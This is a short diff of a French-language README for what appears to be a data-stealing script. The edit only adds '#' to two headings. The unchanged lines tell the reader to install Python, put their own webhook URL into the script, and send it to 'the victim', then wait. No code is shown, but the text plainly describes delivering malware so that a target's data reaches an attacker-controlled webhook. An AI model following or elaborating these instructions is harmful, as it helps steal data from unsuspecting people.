@@ -6,11 +6,11 @@ si vous lancer le script ,cela veut dire que vous accepter les conditions
 d'utilisation
 _____________________________________________________________________________________
 
-I.Condition
+#I.Condition
 
 Veuillez instalelr python avant d'ouvrir le script
 
-II.Comment l'utiliser
+#II.Comment l'utiliser
 
 Remplacer URL-Webhook par l'url de vôtre webhook
 Envoyer le tout simplement a la victime puis attendai
